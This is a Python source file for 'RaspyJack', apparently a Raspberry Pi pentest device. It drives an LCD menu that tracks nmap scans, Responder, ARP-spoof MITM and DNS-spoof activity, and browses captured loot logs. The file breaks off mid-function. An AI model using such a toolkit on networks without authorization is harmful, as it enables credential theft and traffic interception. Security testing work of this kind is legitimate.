#!/usr/bin/env python3

import os
import subprocess
import netifaces
from datetime import datetime
import threading, time, json
from PIL import Image, ImageDraw, ImageFont
import LCD_Config
import LCD_1in44
import RPi.GPIO as GPIO
from functools import partial
import time
import sys
import textwrap

# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z

# --- Plugin system ---------------------------------------------
try:
    from plugins.base import PluginManager
except Exception as _plug_exc:  # allow running without plugins
    PluginManager = None
    print(f"[PLUGIN] Plugin system not available: {_plug_exc}")

# WiFi Integration - Add dual interface support
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import (
        get_best_interface, 
        get_interface_ip, 
        get_interface_network,
        get_nmap_target_network,
        get_mitm_interface,
        get_responder_interface,
        get_dns_spoof_ip,
        show_interface_info,
        set_raspyjack_interface
    )
    WIFI_AVAILABLE = True
    print("✅ WiFi integration loaded - dual interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    print("   Using ethernet-only mode")
    WIFI_AVAILABLE = False
    
    # Fallback functions for ethernet-only mode
    def get_best_interface():
        return "eth0"
    def get_interface_ip(interface):
        try:
            return subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip().split('/')[0]
        except:
            return None
    def get_nmap_target_network():
        try:
            return subprocess.check_output("ip -4 addr show eth0 | awk '/inet / { print $2 }'", shell=True).decode().strip()
        except:
            return None
    def get_mitm_interface():
        return "eth0"
    def get_responder_interface():
        return "eth0"  
    def get_dns_spoof_ip():
        try:
            return subprocess.check_output("ip -4 addr show eth0 | awk '/inet / {split($2, a, \"/\"); print a[1]}'", shell=True).decode().strip()
        except:
            return None
    def set_raspyjack_interface(interface):
        print(f"⚠️  WiFi integration not available - cannot switch to {interface}")
        return False
_stop_evt = threading.Event()
screen_lock = threading.Event()

class StatusBar:
    """Activity and temporary status management"""
    __slots__ = ("_activity", "_temp_msg", "_temp_expires", "_lock")

    def __init__(self):
        self._activity: str = ""
        self._temp_msg: str = ""
        self._temp_expires: float = 0.0
        self._lock = threading.Lock()

    # ---- Activity status -------------------------------------------------
    def set_activity(self, new_value: str):
        if new_value is None:
            return
        with self._lock:
            if new_value != self._activity:
                self._activity = new_value

    def get_activity(self) -> str:
        with self._lock:
            return self._activity

    # ---- Temporary status ------------------------------------------------
    def set_temp_status(self, message: str, ttl: float = 3.0):
        if not message:
            return
        ttl = max(0.5, ttl)
        expires = time.time() + ttl
        with self._lock:
            self._temp_msg = message
            self._temp_expires = expires

    # ---- Composition -----------------------------------------------------
    def get_status_msg(self) -> str:
        now = time.time()
        with self._lock:
            if self._temp_msg and now < self._temp_expires:
                return self._temp_msg
            if self._temp_msg and now >= self._temp_expires:
                # clear expired temporary message
                self._temp_msg = ""
            return self._activity

    # ---- Rendering ------------------------------------------------------
    def render(self, draw_obj, font_obj) -> None:
        """Render the top status bar."""
        try:
            # Background band
            draw_obj.rectangle((0, 0, 128, 12), fill="#000000")
            # Status (may be empty)
            status_txt = self.get_status_msg()
            if status_txt:
                # Centered position
                try:
                    status_width = font_obj.getbbox(status_txt)[2]
                except AttributeError:  # Fallback for older PIL
                    status_width = font_obj.getsize(status_txt)[0]
                draw_obj.text(((128 - status_width) / 2, 0), status_txt, fill="WHITE", font=font_obj)
        except Exception:
            pass

    # ---- Introspection --------------------------------------------------
    def is_busy(self) -> bool:
        """Return True if there is any (temp or activity) message displayed.

        Plugins can use this to decide whether to hide small indicators to
        avoid visual clutter when status text is present.
        """
        return bool(self.get_status_msg())

status_bar = StatusBar()

def _compute_activity_status() -> str:
    try:
        devnull = subprocess.DEVNULL
        call = subprocess.call
        if call(['pgrep', '-x', 'nmap'], stdout=devnull, stderr=devnull) == 0:
            return "(Scan in progress)"
        if 'is_mitm_running' in globals() and callable(is_mitm_running) and is_mitm_running():
            return "(MITM & sniff)"
        if call(['pgrep', '-x', 'ettercap'], stdout=devnull, stderr=devnull) == 0:
            return "(DNSSpoof)"
        if 'is_responder_running' in globals() and callable(is_responder_running) and is_responder_running():
            return "(Responder)"
    except Exception:
        pass
    return ""

def _stats_update_loop():
    """Background thread that updates stats at fixed interval regardless of render FPS."""
    while not _stop_evt.is_set():
        if not screen_lock.is_set():  # pause updates while payload owns screen
            # Activity status
            activity = _compute_activity_status()
            status_bar.set_activity(activity)
        time.sleep(2.0)

def _render_loop():
    """Update stats (if needed) and render overlays."""
    TICK = 0.1  # ~10 FPS overlay
    while not _stop_evt.is_set():
        if screen_lock.is_set():  # UI frozen by payload
            time.sleep(0.2)
            continue
        # Prepare frame from base buffer
        frame = image.copy()
        draw_frame = ImageDraw.Draw(frame)
        # Draw status/temperature bar via StatusBar helper
        status_bar.render(draw_frame, font)

        # Plugins overlays
        if '_plugin_manager' in globals() and _plugin_manager is not None:
            try:
                _plugin_manager.dispatch_tick()
                _plugin_manager.dispatch_render_overlay(frame, draw_frame)
            except Exception:
                pass

        # Push to LCD
        try:
            LCD.LCD_ShowImage(frame, 0, 0)
        except Exception:
            pass
        time.sleep(TICK)

def start_background_loops():
    threading.Thread(target=_stats_update_loop, daemon=True).start()
    threading.Thread(target=_render_loop, daemon=True).start()

if os.getuid() != 0:
        print("You need a sudo to run this!")
        exit()
print(" ")
print(" ------ RaspyJack Started !!! ------ ")
start_time = time.time()

####### Classes except menu #######
### Global mostly static values ###
class Defaults():
    start_text = [12, 22]
    text_gap = 14

    updown_center = 52
    updown_pos = [15, updown_center, 88]


    imgstart_path = "/root/"

    install_path = "/root/Raspyjack/"
    config_file = install_path + "gui_conf.json"

    payload_path = install_path + "payloads/"
    payload_log  = install_path + "loot/payload.log"


### Color scheme class ###
class template():
    # Color values
    border = "#0e0e6b"
    background = "#000000"
    text = "#9c9ccc"
    selected_text = "#EEEEEE"
    select = "#141494"
    gamepad = select
    gamepad_fill = selected_text

    # Render the border
    def DrawBorder(self):
        draw.line([(127, 12), (127, 127)], fill=self.border, width=5)
        draw.line([(127, 127), (0, 127)], fill=self.border, width=5)
        draw.line([(0, 127), (0, 12)], fill=self.border, width=5)
        draw.line([(0, 12), (128, 12)], fill=self.border, width=5)

    # Render inside of the border
    def DrawMenuBackground(self):
        draw.rectangle((3, 14, 124, 124), fill=self.background)

    # I don't know how to python pass 'class.variable' as reference properly
    def Set(self, index, color):
        if index == 0:
            self.background = color
        elif index == 1:
            self.border = color
            self.DrawBorder()
        elif index == 2:
            self.text = color
        elif index == 3:
            self.selected_text = color
        elif index == 4:
            self.select = color
        elif index == 5:
            self.gamepad = color
        elif index == 6:
            self.gamepad_fill = color

    def Get(self, index):
        if index == 0:
            return self.background
        elif index == 1:
            return self.border
        elif index == 2:
            return self.text
        elif index == 3:
            return self.selected_text
        elif index == 4:
            return self.select
        elif index == 5:
            return self.gamepad
        elif index == 6:
            return self.gamepad_fill

    # Methods for JSON export
    def Dictonary(self):
        x = {
            "BORDER" : self.border,
            "BACKGROUND" : self.background,
            "TEXT" : self.text,
            "SELECTED_TEXT" : self.selected_text,
            "SELECTED_TEXT_BACKGROUND" : self.select,
            "GAMEPAD" : self.gamepad,
            "GAMEPAD_FILL" : self.gamepad_fill
        }
        return x
    def LoadDictonary(self, dic):
        self.Set(1,dic["BORDER"])
        self.background = dic["BACKGROUND"]
        self.text = dic["TEXT"]
        self.selected_text = dic["SELECTED_TEXT"]
        self.select = dic["SELECTED_TEXT_BACKGROUND"]
        self.gamepad = dic["GAMEPAD"]
        self.gamepad_fill = dic["GAMEPAD_FILL"]

####### Simple methods #######
### Get any button press ###
def getButton():
    while 1:
        for item, pin in PINS.items():
            val = GPIO.input(pin)
            if item in EDGE_BUTTONS:
                prev = _button_prev.get(item, 1)
                if prev == 1 and val == 0:  # rising edge (released -> pressed)
                    _button_prev[item] = val
                    if '_plugin_manager' in globals() and _plugin_manager is not None:
                        try:
                            _plugin_manager.dispatch_button(item)
                        except Exception:
                            pass
                    return item
                _button_prev[item] = val
            else:
                if val == 0:
                    if '_plugin_manager' in globals() and _plugin_manager is not None:
                        try:
                            _plugin_manager.dispatch_button(item)
                        except Exception:
                            pass
                    return item
        time.sleep(0.01)


def Leave(poweroff: bool = False) -> None:
    _stop_evt.set()
    if '_plugin_manager' in globals() and _plugin_manager is not None:
        try:
            _plugin_manager.unload_all()
        except Exception:
            pass
    GPIO.cleanup()
    if poweroff:
        os.system("sync && poweroff")
    print("Bye!")
    sys.exit(0)


def Restart():
    print("Restarting the UI!")
    Dialog("Restarting!", False)
    arg = ["-n","-5",os.sys.executable] + sys.argv
    os.execv(os.popen("whereis nice").read().split(" ")[1], arg)
    Leave()


def safe_kill(*names):
    for name in names:
        subprocess.run(
            ["pkill", "-9", "-x", name],      # -x = nom exact
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

### Two threaded functions ###
# One for updating status bar and one for refreshing display #
def is_responder_running():
    time.sleep(1)
    ps_command = "ps aux | grep Responder.py | grep -v grep | awk '{print $2}'"
    try:
        output = subprocess.check_output(ps_command, shell=True)
        pid = int(output.strip())
        return True
    except (subprocess.CalledProcessError, ValueError):
        return False

def is_mitm_running():
    time.sleep(1)
    tcpdump_running = subprocess.call(['pgrep', 'tcpdump'], stdout=subprocess.DEVNULL) == 0
    arpspoof_running = subprocess.call(['pgrep', 'arpspoof'], stdout=subprocess.DEVNULL) == 0
    return tcpdump_running or arpspoof_running


def SaveConfig() -> None:
    data = {
        "PINS":   PINS,
        "PATHS":  {"IMAGEBROWSER_START": default.imgstart_path},
        "COLORS": color.Dictonary(),
    }
    print(json.dumps(data, indent=4, sort_keys=True))
    with open(default.config_file, "w") as wf:
        json.dump(data, wf, indent=4, sort_keys=True)
    print("Config has been saved!")



def LoadConfig():
    global PINS
    global default

    if not (os.path.exists(default.config_file) and os.path.isfile(default.config_file)):
        print("Can't find a config file! Creating one at '" + default.config_file + "'...")
        SaveConfig()

    with open(default.config_file, "r") as rf:
        data = json.load(rf)
        default.imgstart_path = data["PATHS"].get("IMAGEBROWSER_START", default.imgstart_path)
        PINS = data.get("PINS", PINS)
        try:
            color.LoadDictonary(data["COLORS"])
        except:
            pass
        GPIO.setmode(GPIO.BCM)
        for item in PINS:
            GPIO.setup(PINS[item], GPIO.IN, pull_up_down=GPIO.PUD_UP)
    print("Config loaded!")

# ---------------- Plugin enable/disable menu -----------------------------
def _plugins_config_path():
    return os.path.join(default.install_path, 'plugins', 'plugins_conf.json')

def load_plugins_conf():
    try:
        with open(_plugins_config_path(), 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_plugins_conf(cfg: dict):
    try:
        os.makedirs(os.path.dirname(_plugins_config_path()), exist_ok=True)
        with open(_plugins_config_path(), 'w') as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"[PLUGIN] Failed saving plugins_conf: {e}")

def reload_plugins():
    global _plugin_manager
    if 'PluginManager' not in globals() or PluginManager is None:
        return
    cfg = load_plugins_conf()
    if _plugin_manager is None:
        _plugin_manager = PluginManager()
    else:
        try:
            _plugin_manager.unload_all()
        except Exception:
            pass
    ctx = {
        'exec_payload': lambda name: exec_payload(name),
        'get_menu': lambda: m.GetMenuList(),
        'is_responder_running': is_responder_running,
        'is_mitm_running': is_mitm_running,
        'draw_image': lambda: image,
        'draw_obj': lambda: draw,
        'status_bar': status_bar,
    }
    if hasattr(_plugin_manager, 'load_from_config'):
        _plugin_manager.load_from_config(cfg, ctx)
    else:
        names = [k for k, v in cfg.items() if isinstance(v, dict) and v.get('enabled')]
        _plugin_manager.load_all(names, ctx)

####### Drawing functions #######

### Simple message box ###
# (Text, Wait for confirmation)  #
def Dialog(a, wait=True):
    draw.rectangle([7, 35, 120, 95], fill="#ADADAD")
    draw.text((35 - len(a), 45), a, fill="#000000")
    draw.rectangle([45, 65, 70, 80], fill="#FF0000")

    draw.text((50, 68), "OK", fill=color.selected_text)
    if wait:
        time.sleep(0.25)
        getButton()

def Dialog_info(a, wait=True):
    draw.rectangle([3, 14, 124, 124], fill="#00A321")
    draw.text((35 - len(a), 45), a, fill="#000000")

### Yes or no dialog ###
# (b is second text line)
def YNDialog(a="Are you sure?", y="Yes", n="No",b=""):
    draw.rectangle([7, 35, 120, 95], fill="#ADADAD")
    draw.text((35 - len(a), 40), a, fill="#000000")
    draw.text((12, 52), b, fill="#000000")
    time.sleep(0.25)
    answer = False
    while 1:
        render_color = "#000000"
        render_bg_color = "#ADADAD"
        if answer:
            render_bg_color = "#FF0000"
            render_color = color.selected_text
        draw.rectangle([15, 65, 45, 80], fill=render_bg_color)
        draw.text((20, 68), y, fill=render_color)

        render_color = "#000000"
        render_bg_color = "#ADADAD"
        if not answer:
            render_bg_color = "#FF0000"
            render_color = color.selected_text
        draw.rectangle([76, 65, 106, 80], fill=render_bg_color)
        draw.text((86, 68), n, fill=render_color)

        button = getButton()
        if button == "KEY_LEFT_PIN" or button == "KEY1_PIN":
            answer = True
        elif button == "KEY_RIGHT_PIN" or button == "KEY3_PIN":
            answer = False
        elif button == "KEY2_PIN" or button == "KEY_PRESS_PIN":
            return answer

### Scroll through text pictures ###
# 8 lines of text on screen at once
# No selection just scrolling through info
def GetMenuPic(a):
    # a=[ [row,2,3,4,5,6,7,8] <- slide, [1,2,3,4,5,6,7,8] ]
    slide=0
    while 1:
        arr=a[slide]
        color.DrawMenuBackground()
        for i in range(0, len(arr)):
            render_text = arr[i]
            render_color = color.text
            draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                      render_text[:m.max_len], fill=render_color)
        time.sleep(0.1)
        button = getButton()
        if button == "KEY_UP_PIN":
            slide = slide-1
            if slide < 0:
                slide = len(a)-1
        elif button == "KEY_DOWN_PIN":
            slide = slide+1
            if slide >= len(a):
                slide = 0
        elif button == "KEY_PRESS_PIN" or button == "KEY_RIGHT_PIN":
            return slide
        elif button == "KEY_LEFT_PIN":
            return -1

### Render first lines of array ###
# Kinda useless but whatever
def ShowLines(arr,bold=[]):
    color.DrawMenuBackground()
    arr = arr[-8:]
    for i in range(0, len(arr)):
        render_text = arr[i]
        render_color = color.text
        if i in bold:
            render_text = m.char + render_text
            render_color = color.selected_text
            draw.rectangle([(default.start_text[0]-5, default.start_text[1] + default.text_gap * i),
                            (120, default.start_text[1] + default.text_gap * i + 10)], fill=color.select)
        draw.text((default.start_text[0], default.start_text[1] + default.text_gap * i),
                    render_text[:m.max_len], fill=render_color)

def GetMenuString(inlist, duplicates=False):
    """
    Display a variable-size dropdown list in an 8-line window.
    - Smooth scrolling (one item at a time).
    - Circular navigation.
    - If duplicates=True : returns (index, value) ; otherwise returns value.
    - If the list is empty : displays a placeholder and returns "".
    """
    WINDOW      = 7                 # lines visible simultaneously
    CURSOR_MARK = m.char            # '> '
    empty       = False

    if not inlist:
        inlist, empty = ["Nothing here :(   "], True

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    total   = len(inlist)           # nb total d'items
    # Persist selection index per menu (so plugin submenu keeps its position)
    global _menu_indices
    try:
        _menu_indices
    except NameError:
        _menu_indices = {}
    index   = _menu_indices.get(m.which, 0) if m.which else 0  # current index (0-based)
    offset  = 0                     # index du 1er item visible (0-based)

    while True:
        # -- 1/ Recalcule la fenêtre pour que index soit toujours dedans -----
        if index < offset:
            offset = index
        elif index >= offset + WINDOW:
            offset = index - WINDOW + 1

        # -- 2/ Compose la fenêtre à afficher (pas de wrap visuel) ----------
        window = inlist[offset:offset + WINDOW]

        # Save current index for this menu so reopening keeps position
        _menu_indices[m.which] = index

        # -- 3/ Rendu --------------------------------------------------------
        color.DrawMenuBackground()
        for i, raw in enumerate(window):
            txt = raw if not duplicates else raw.split('#', 1)[1]
            line = txt  # Remove cursor mark, use rectangle highlight only
            fill = color.selected_text if i == (index - offset) else color.text
            # zone de surbrillance
            if i == (index - offset):
                draw.rectangle(
                    (default.start_text[0] - 5,
                     default.start_text[1] + default.text_gap * i,
                     120,
                     default.start_text[1] + default.text_gap * i + 10),
                    fill=color.select
                )
            
            # Draw Font Awesome icon if available (only on main menu)
            if m.which == "a":  # Only show icons on main menu
                icon = MENU_ICONS.get(txt, "")
                if icon:
                    draw.text(
                        (default.start_text[0] - 2,
                         default.start_text[1] + default.text_gap * i),
                        icon,
                        font=icon_font,
                        fill=fill
                    )
                    # Draw text with offset for icon
                    draw.text(
                        (default.start_text[0] + 12,
                         default.start_text[1] + default.text_gap * i),
                        line[:m.max_len],
                        font=text_font,
                        fill=fill
                    )
                else:
                    # Draw text normally if no icon
                    draw.text(
                        (default.start_text[0],
                         default.start_text[1] + default.text_gap * i),
                        line[:m.max_len],
                        font=text_font,
                        fill=fill
                    )
            else:
                # Submenus: no icons, just text
                draw.text(
                    (default.start_text[0],
                     default.start_text[1] + default.text_gap * i),
                    line[:m.max_len],
                    font=text_font,
                    fill=fill
                )
        
        # Display current view mode indicator (only on main menu)
        # if m.which == "a":
        #     draw.text((2, 2), "List", font=text_font, fill=color.text)
        
        time.sleep(0.12)

        # -- 4/ Lecture des boutons -----------------------------------------
        btn = getButton()

        if btn == "KEY_DOWN_PIN":
            index = (index + 1) % total      # wrap vers le début
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total      # wrap vers la fin
        elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
            raw = inlist[index]
            if empty:
                return (-2, "") if duplicates else ""
            if duplicates:
                idx, txt = raw.split('#', 1)
                return int(idx), txt
            return raw
        elif btn == "KEY1_PIN" and m.which == "a":
            # Toggle to grid view (only on main menu)
            toggle_view_mode()
            return (-1, "") if duplicates else ""
        elif btn == "KEY2_PIN":
            if m.which == "al":  # Plugin menu
                if index < total:
                    selected_item = inlist[index]
                    # Extract plugin name from " [x] plugin_name"
                    if ']' in selected_item:
                        plugin_name = selected_item.split('] ')[-1]
                        if _plugin_manager:
                            # Get info and display it in a scrollable view
                            info = _plugin_manager.get_plugin_info(plugin_name)
                            DisplayScrollableInfo(info.split('\n'))
        elif btn == "KEY_LEFT_PIN":
            return (-1, "") if duplicates else ""



### Draw up down triangles ###
color = template()
def DrawUpDown(value, offset=0, up=False,down=False, render_color=color.text):
    draw.polygon([(offset, 53), (10 + offset, 35), (20+offset, 53)],
        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[up])
    draw.polygon([(10+offset, 93), (20+offset, 75), (offset, 75)],
        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[down])

    draw.rectangle([( offset + 2, 60),(offset+30, 70)], fill=color.background)
    draw.text((offset + 2, 60), str(value) , fill=render_color)


### Screen for selecting RGB color ###
def GetColor(final_color="#000000"):
    color.DrawMenuBackground()
    time.sleep(0.4)
    i_rgb = 0
    render_offset = default.updown_pos
    desired_color = list(int(final_color[i:i+2], 16) for i in (1, 3, 5))

    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        render_up = False
        render_down = False
        final_color='#%02x%02x%02x' % (desired_color[0],desired_color[1],desired_color[2])

        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(120, default.start_text[1] + default.text_gap * 0 + 10)], fill=final_color)
        draw.rectangle([(default.start_text[0]-5, 3+ default.start_text[1] + default.text_gap * 6),(120, default.start_text[1] + default.text_gap * 6 + 12)], fill=final_color)

        DrawUpDown(desired_color[0],render_offset[0],render_up,render_down,(color.text, color.selected_text)[i_rgb == 0])
        DrawUpDown(desired_color[1],render_offset[1],render_up,render_down,(color.text, color.selected_text)[i_rgb == 1])
        DrawUpDown(desired_color[2],render_offset[2],render_up,render_down,(color.text, color.selected_text)[i_rgb == 2])

        button = getButton()
        if button == "KEY_LEFT_PIN":
            i_rgb = i_rgb - 1
            time.sleep(0.1)
        elif button == "KEY_RIGHT_PIN":
            i_rgb = i_rgb + 1
            time.sleep(0.1)
        elif button == "KEY_UP_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] + 5
            render_up = True
        elif button == "KEY_DOWN_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] - 5
            render_down = True
        elif button == "KEY1_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] + 1
            render_up = True
        elif button == "KEY3_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] - 1
            render_down = True
        elif button == "KEY_PRESS_PIN":
            break

        if i_rgb > 2:
            i_rgb = 0
        elif i_rgb < 0:
            i_rgb = 2

        if desired_color[i_rgb] > 255:
            desired_color[i_rgb] = 0
        elif desired_color[i_rgb] < 0:
            desired_color[i_rgb] = 255

        DrawUpDown(desired_color[i_rgb],render_offset[i_rgb],render_up,render_down,color.selected_text)
        time.sleep(0.1)
    return final_color

### Set color based on indexes (not reference pls help)###
def SetColor(a):
    m.which = m.which + "1"
    c = GetColor(color.Get(a))
    if YNDialog(a="Set color to?", y="Yes", n="No",b=("    " + c) ):
        color.Set(a, c)
        Dialog("   Done!")
    m.which = m.which[:-1]

### Select a single value###
def GetIpValue(prefix):
    value = 1
    render_offset = default.updown_pos
    color.DrawMenuBackground()
    time.sleep(0.4)
    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        render_up = False
        render_down = False

        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(120, default.start_text[1] + default.text_gap * 5)], fill=color.background)
        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
        draw.text(( 5,60), f"IP:{prefix}.", fill=color.selected_text)

        button = getButton()
        if button == "KEY_UP_PIN":
            value = min(255, value + 1)
            render_up = True
        elif button == "KEY_DOWN_PIN":
            value = max(0, value - 1)
            render_down = True
        elif button == "KEY1_PIN":
            value = min(255, value + 5)
            render_up = True
        elif button == "KEY3_PIN":
            value = max(0, value - 5)
            render_down = True
        elif button == "KEY_PRESS_PIN":
            break

        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
        time.sleep(0.1)
    return value



### Gamepad ###
def Gamepad():
    color.DrawMenuBackground()
    time.sleep(0.5)
    draw.rectangle((25, 55, 45, 73), outline=color.gamepad,
                   fill=color.background)
    draw.text((28, 59), "<<<", fill=color.gamepad)
    m.which = m.which + "1"
    # Don't render if you dont need to => less flickering
    lastimg = [0, 0, 0, 0, 0, 0, 0]
    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        write = ""
        x = 0
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_UP_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " UP"
        if i != lastimg[x] or i == 0:
            draw.polygon([(25, 53), (35, 35), (45, 53)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_LEFT_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " LEFT"
        if i != lastimg[x] or i == 0:
            draw.polygon([(5, 63), (23, 54), (23, 74)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_RIGHT_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " RIGHT"
        if i != lastimg[x] or i == 0:
            draw.polygon([(65, 63), (47, 54), (47, 74)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_DOWN_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " DOWN"
        if i != lastimg[x] or i == 0:
            draw.polygon([(35, 93), (45, 75), (25, 75)],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY1_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " Q"
        if i != lastimg[x] or i == 0:
            draw.ellipse((70, 33, 90, 53), outline=color.gamepad,
                         fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY2_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " E"
        if i != lastimg[x] or i == 0:
            draw.ellipse((100, 53, 120, 73),
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY3_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " R"
        if i != lastimg[x] or i == 0:
            draw.ellipse((70, 73, 90, 93), outline=color.gamepad,
                         fill=render_color)
        lastimg[x] = i

        if write != "":
            render_chars = ""
            for item in write[1:].split(" "):
                render_chars += "press(\"" + item + "\");"
            print(os.popen("P4wnP1_cli hid job -t 5 -c '" + render_chars + "'").read())
            time.sleep(0.25)
    m.which = m.which[:-1]
    time.sleep(0.25)

### Basic info screen ###
def ShowInfo():
    """Display network information using scrollable text view."""
    # Collect network information once
    try:
        # Get best available interface (WiFi or ethernet)
        interface = get_best_interface()
        
        # Retrieve configuration information for active interface
        interface_config = netifaces.ifaddresses(interface)
        interface_ipv4 = interface_config[netifaces.AF_INET][0]['addr']
        interface_subnet_mask = interface_config[netifaces.AF_INET][0]['netmask']
        interface_gateway = netifaces.gateways()["default"][netifaces.AF_INET][0]
        output = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True)
        address = output.decode().strip().split('\\')[0]

        if interface_ipv4:
            # Connected - create scrollable information display
            info_lines = [
                f"Interface: {interface}",
                f"IP: {interface_ipv4}",
                f"Subnet: {interface_subnet_mask}",
                "Gateway:",
                f"  {interface_gateway}",
                "Attack:",
                f"  {address}",
            ]
            
            # Add WiFi-specific info if applicable
            if interface.startswith('wlan') and WIFI_AVAILABLE:
                try:
                    from wifi.wifi_manager import wifi_manager
                    status = wifi_manager.get_connection_status(interface)
                    if status["ssid"]:
                        info_lines.extend([
                            "SSID:",
                            f"  {status['ssid']}"
                        ])
                except:
                    pass
        else:
            # Not connected
            info_lines = [
                f"Interface: {interface}",
                "Status: No connection",
                "Check network cable",
                "or try WiFi manager"
            ]
    except (KeyError, IndexError, ValueError, OSError) as e:
        # Handle exceptions with detailed error info
        info_lines = [
            "Network Error",
            f"Details: {str(e)[:15]}...",
            "Check ethernet cable",
            "or use WiFi Manager"
        ]
    
    # Display scrollable network info
    DisplayScrollableInfo(info_lines)


def DisplayScrollableInfo(info_lines):
    """Display scrollable text information with automatic line wrapping."""
    # Estimate character width for wrapping.
    WRAP_WIDTH = 24
    
    wrapped_info_lines = []
    for line in info_lines:
        # Wrap the line and add the resulting lines to new list
        wrapped_lines = textwrap.wrap(line, width=WRAP_WIDTH, replace_whitespace=False, drop_whitespace=False)
        if not wrapped_lines:
            wrapped_info_lines.append('')
        else:
            wrapped_info_lines.extend(wrapped_lines)

    info_lines = wrapped_info_lines
    WINDOW = 7  # lines visible simultaneously
    total = len(info_lines)
    if total == 0:
        return
        
    index = 0   # current position
    offset = 0  # window offset

    while True:
        # Calculate window for scrolling
        if index < offset:
            offset = index
        elif index >= offset + WINDOW:
            offset = index - WINDOW + 1

        # Get visible window
        window = info_lines[offset:offset + WINDOW]

        # Draw display
        color.DrawMenuBackground()
        for i, line in enumerate(window):
            fill = color.selected_text if i == (index - offset) else color.text
            # Highlight current line
            if i == (index - offset):
                draw.rectangle(
                    (default.start_text[0] - 5,
                     default.start_text[1] + default.text_gap * i,
                     120,
                     default.start_text[1] + default.text_gap * i + 10),
                    fill=color.select
                )
            
            # Draw the text
            draw.text(
                (default.start_text[0],
                 default.start_text[1] + default.text_gap * i),
                line,
                font=text_font,
                fill=fill
            )

        time.sleep(0.12)

        # Handle button input
        btn = getButton()
        if btn == "KEY_DOWN_PIN":
            index = (index + 1) % total  # wrap to beginning
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total  # wrap to end
        elif btn in ("KEY_LEFT_PIN", "KEY3_PIN", "KEY_PRESS_PIN"):
            return  # Exit on back/left/press button


def Explorer(path="/",extensions=""):
    # ".gif\|.png\|.bmp\|.jpg\|.tiff\|.jpeg"
    while 1:
        arr = ["../"] + os.popen("ls --format=single-column -F " + path + (" | grep \"" + extensions + "\|/\"","")[extensions==""] ).read().replace("*","").split("\n")[:-1]
        output = GetMenuString(arr,False)
        if output != "":
            if output == "../":
                if path == "/":
                    break
                else:
                    path = (path,path[:-1])[path[-1] == "/"]
                    path = path[:path.rindex("/")]
                    if path == "":
                        path = "/"
                    else:
                        path = (path + "/",path)[path[-1] == "/"]
            elif output[-1] == "/":
                path = (path + "/",path)[path[-1] == "/"]
                path = path + output
                path = (path + "/",path)[path[-1] == "/"]
            else:
                if YNDialog("Open?","Yes","No",output[:10]):
                    return path + output
        else:
            break
    return ""

def ReadTextFileNmap():
    while 1:
        rfile = Explorer("/root/Raspyjack/loot/Nmap/",extensions=".txt\|.json\|.conf\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ReadTextFileResponder():
    while 1:
        rfile = Explorer("/root/Raspyjack/Responder/logs/",extensions=".log\|.txt\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ReadTextFileDNSSpoof():
    while 1:
        rfile = Explorer("/root/Raspyjack/DNSSpoof/captures/",extensions=".log\|.txt\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ImageExplorer() -> None:
    m.which += "1"
    path = default.imgstart_path
    while True:
        arr = ["./"] + os.popen(
            f'ls --format=single-column -F "{path}" | '
            'grep ".gif\\|.png\\|.bmp\\|.jpg\\|.tiff\\|.jpeg\\|/"'
        ).read().replace("*", "").split("\n")[:-1]

        output = GetMenuString(arr, False)
        if not output:
            break

        # ───── navigation ─────
        if output == "./":                       # remonter
            if path == "/":
                break
            path = path.rstrip("/")
            path = path[:path.rindex("/")] or "/"
            if not path.endswith("/"):
                path += "/"
